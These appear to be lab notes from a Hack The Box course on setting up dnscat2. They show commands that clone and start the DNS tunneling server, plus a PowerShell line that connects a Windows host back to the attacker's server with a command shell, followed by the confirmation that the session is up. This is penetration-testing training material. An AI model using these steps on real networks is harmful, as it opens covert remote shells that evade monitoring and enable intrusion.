## Setting Up & Using dnscat2
#### Cloning dnscat2 and Setting Up the Server

```shell
3kjS@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git 

cd dnscat2/server/ 
sudo gem install bundler 
sudo bundle install
```
#### Starting the dnscat2 server

```shell
3kjS@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
#### Cloning dnscat2-powershell to the Attack Host

```shell
3kjS@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
#### Importing dnscat2.ps1

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
#### Confirming Session Establishment

```shell
New window created: 1 
Session 1 Security: ENCRYPTED AND VERIFIED! 
(the security depends on the strength of your pre-shared secret!) 

dnscat2>
```
#### Listing dnscat2 Options

```shell
dnscat2> ? 
Here is a list of commands (use -h on any of them for additional help): 
```
#### Interacting with the Established Session
![[Screenshot 2026-05-20 at 16.28.18.png]]
